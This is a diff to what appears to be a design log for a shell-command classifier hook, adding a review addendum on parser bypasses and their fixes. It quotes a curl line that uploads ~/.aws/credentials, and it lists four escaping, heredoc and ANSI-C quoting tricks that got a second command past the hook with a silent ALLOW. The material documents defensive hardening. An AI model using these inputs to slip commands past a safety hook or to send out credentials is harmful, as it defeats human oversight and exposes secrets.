@@ -3899,3 +3899,25 @@ the finding #17 ambiguity rule is unchanged underneath it.
 - Still open: a single plain network command remains ALLOW in a clean session,
   including `curl -F f=@~/.aws/credentials …`. What that command *reads* is the
   shell-path residual D57 already names, not a classification question.
+
+**Addendum (PR #153 review, 2026-10-25).** An external review of the first version
+found that the splitter itself could be talked past. Each line below got a silent ALLOW
+from the hook, and real bash ran its second command:
+
+- `curl x \ #; printf X`: an escaped space was kept as whitespace, so `#` looked like
+  the start of a comment.
+- `curl x \>& printf X`: an escaped `>` made `&` look like a redirection.
+- `curl --config - <<EOF` with a quote inside the heredoc body: the quote paired
+  with one after the delimiter and hid the next command.
+- `curl x $'\'' ; printf X #'`: ANSI-C quoting has escapes a plain single quote
+  does not. This one was found in the same pass.
+
+The rule now:
+
+- an escaped byte becomes the same non-whitespace, non-operator stand-in as a quoted
+  span;
+- a heredoc (`<<`, `<<-`) and ANSI-C quoting resolve to `default_to`;
+- a here-string (`<<<`) stays a single word.
+
+The splitter keeps its narrow contract. Anything it does not model must fail
+closed, and every new escape route found later gets a regression case beside these.
